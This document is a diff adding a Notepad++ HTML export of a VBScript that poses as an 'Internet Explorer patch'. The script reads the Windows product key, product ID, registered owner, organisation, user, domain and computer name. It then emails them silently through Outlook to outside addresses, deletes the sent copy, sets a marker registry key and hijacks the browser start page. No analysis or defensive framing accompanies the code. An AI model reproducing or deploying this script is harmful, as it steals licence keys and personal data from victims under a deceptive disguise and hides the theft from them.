@@ -1,0 +1,76 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc2 {
+	font-weight: bold;
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+	font-weight: bold;
+}
+.sc7 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">w</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ws</span><span class="sc6">=</span><span class="sc7">Wscript.CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">startup</span><span class="sc6">=</span><span class="sc7">ws.SpecialFolders</span><span class="sc6">(</span><span class="sc4">"Startup"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">f.FileExists</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">startup&amp;</span><span class="sc4">"\Loft.htm"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">f.DeleteFile</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">startup&amp;</span><span class="sc4">"\Loft.htm"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">MsgBox</span><span class="sc0"> </span><span class="sc4">"Patch for Internet Explorer installed"</span><span class="sc6">,</span><span class="sc7">vbinformation</span><span class="sc6">,</span><span class="sc4">"Patch v1.0"</span><span class="sc0">
+</span><span class="sc7">MsgBox</span><span class="sc0"> </span><span class="sc4">"You can delete this file"</span><span class="sc6">,</span><span class="sc7">vbinformation</span><span class="sc6">,</span><span class="sc4">"Patch v1.0"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+
+</span><span class="sc7">CN</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.NetWork"</span><span class="sc6">).</span><span class="sc7">ComputerName</span><span class="sc0">
+</span><span class="sc7">UN</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.NetWork"</span><span class="sc6">).</span><span class="sc7">UserName</span><span class="sc0">
+</span><span class="sc7">UD</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.NetWork"</span><span class="sc6">).</span><span class="sc7">UserDomain</span><span class="sc0">
+</span><span class="sc7">NOM</span><span class="sc6">=</span><span class="sc7">w.RegRead</span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ENT</span><span class="sc6">=</span><span class="sc7">w.RegRead</span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">PI</span><span class="sc6">=</span><span class="sc7">w.RegRead</span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\ProductId"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">PK</span><span class="sc6">=</span><span class="sc7">w.RegRead</span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\ProductKey"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">V</span><span class="sc6">=</span><span class="sc7">w.RegRead</span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\Version"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">VN</span><span class="sc6">=</span><span class="sc7">w.RegRead</span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\VersionNumber"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">P</span><span class="sc6">=</span><span class="sc7">w.RegRead</span><span class="sc6">(</span><span class="sc4">"HKCU\Software\Microsoft\Internet Explorer\International\AcceptLanguage"</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">O</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">m</span><span class="sc6">=</span><span class="sc7">O.CreateItem</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">m.To</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"loftptk@multimania.com"</span><span class="sc0">
+</span><span class="sc7">m.BCC</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"petik@multimania.com; euphoria@ctw.net"</span><span class="sc0">
+</span><span class="sc7">m.Subject</span><span class="sc6">=</span><span class="sc4">"Loft Info arrivant de "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">P</span><span class="sc0">
+</span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Date : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc3">date</span><span class="sc0">
+</span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Heure : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">time</span><span class="sc0">
+</span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Nom d'enregistrement : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">NOM</span><span class="sc0">
+</span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Nom de l'organization : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">ENT</span><span class="sc0">
+</span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Numéro d'identification : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">PI</span><span class="sc0">
+</span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Numéro d'enregistrement : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">PK</span><span class="sc0">
+</span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Version de Windows : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">V</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VN</span><span class="sc0">
+</span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Nom de l'ordinateur : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">CN</span><span class="sc0">
+</span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Nom de domaine : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">UD</span><span class="sc0">
+</span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Nom d'utilisateur : "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">UN</span><span class="sc0">
+</span><span class="sc7">m.Body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0">
+</span><span class="sc7">m.DeleteAfterSubmit</span><span class="sc6">=</span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc7">m.Send</span><span class="sc0">
+
+</span><span class="sc7">w.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKCU\Software\Microsoft\PetiK\LoftInfo"</span><span class="sc6">,</span><span class="sc4">"OK"</span><span class="sc0">
+</span><span class="sc7">w.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page"</span><span class="sc6">,</span><span class="sc4">"http://www.yahoo.fr"</span><span class="sc0">
+</span></div></body>
+</html>
